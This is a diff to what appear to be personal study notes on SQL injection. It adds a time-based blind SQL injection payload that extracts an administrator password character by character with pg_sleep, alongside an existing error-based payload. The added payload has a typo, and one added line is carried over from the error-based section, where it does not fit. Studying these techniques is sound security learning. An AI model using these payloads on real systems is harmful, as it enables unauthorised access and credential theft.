@@ -61,3 +61,10 @@ On Oracle, you can find the same information as follows:
 - `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--`
 	- if the database is misconfigured it should throw an error like: ERROR: invalid input syntax for type integer: "2x2i4tqll4ctr686jsx2".
 	- the value between the double quotes is the password.
+
+### Blind SQL injection with time delays and information retrieval
+- `1'%3b+SELECT+CASE+WHEN+SUBSTRING((SELECT+passwword+FROM+users+WHERE+username%3d'administrator'),1,{len(password)+1})%3d'{password}{char}'+THEN+pg_sleep(3)+ELSE+pg_sleep+(0)+END--`
+ 
+- DON'T FORGET TO ENCODE THE COOKIE, you can use burp suite for this.
+- the value between the double quotes is the password.
+![[url_encoding_vs_base64encoding.png]]
